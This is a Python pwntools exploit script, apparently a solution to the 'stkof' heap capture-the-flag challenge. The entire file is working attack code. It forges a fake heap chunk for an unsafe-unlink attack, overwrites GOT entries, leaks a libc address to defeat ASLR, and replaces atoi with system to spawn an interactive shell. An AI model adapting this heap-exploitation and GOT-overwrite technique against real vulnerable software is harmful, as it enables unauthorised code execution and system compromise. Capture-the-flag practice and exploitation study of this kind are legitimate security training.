from pwn import *

context.log_level = "debug"

strlen_plt = 0x602030
puts_call = 0x400760
puts_plt = 0x602020
atoi_plt = 0x602088

libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
libc_puts = libc.symbols['puts']
libc_system = libc.symbols['system']

def choose(choice):
	p.sendline(str(choice))

def malloc(size):
	choose(1)
	p.sendline(str(size))
	p.recvuntil('OK\n')

def write(index, data):
	choose(2)
	p.sendline(str(index))
	p.sendline(str(len(data)))
	p.send(data)
	p.recvuntil('OK\n')

def free(index):
	choose(3)
	p.sendline(str(index))
	p.recvuntil('OK\n')

def leak(index):
	choose(4)
	p.sendline(str(index))
	return p.recvuntil('\n')[:-1]			

p = process('./stkof')

malloc(128)
malloc(128)
malloc(128)
write(2, p64(0x0) + p64(0x0) + p64(0x602138) + p64(0x602140) + 'A'*0x60 + p64(0x80) + p64(0x90))
free(3)
write(2, p64(0x0) + p64(0x0) + p64(0x0) + p64(0x602138) + p64(strlen_plt) + p64(puts_plt) + p64(atoi_plt))
write(3, p64(puts_call))

puts_addr = u64(leak(4) + '\x00\x00')
libc_base = puts_addr - libc_puts
system_addr = libc_base + libc_system

write(5, p64(system_addr))
p.sendline('sh')
p.interactive()






